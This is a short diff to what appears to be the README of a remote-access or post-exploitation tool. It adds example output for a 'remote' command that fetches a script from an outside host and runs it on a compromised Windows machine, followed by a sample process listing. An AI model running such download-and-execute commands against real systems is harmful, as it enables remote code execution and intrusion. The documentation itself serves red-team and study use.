@@ -86,8 +86,15 @@ Supported commands:
 [*] DownloadToDisk: Fetching https://home.ringzer0team.com/ps.php
 [*] DownloadToDisk: execution Completed
 
+(10.0.0.153:RINGZER0\mrun1k0d3r):Command >remote https://home.ringzer0team.com/ps.php whoami;ipconfig
+[*] DownloadExecute: Fetching https://home.ringzer0team.com/ps.php
+[*] DownloadExecute: Executing whoami;ipconfig
 
-
+Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName                                 
+-------  ------    -----      ----- -----   ------     -- -----------                                 
+     39       6     2240       5208    46     0.02   4304 AppUIMonitor_00   
+ ...
+ [*] DownloadExecute: execution Completed
 ```
 
 # Credit 
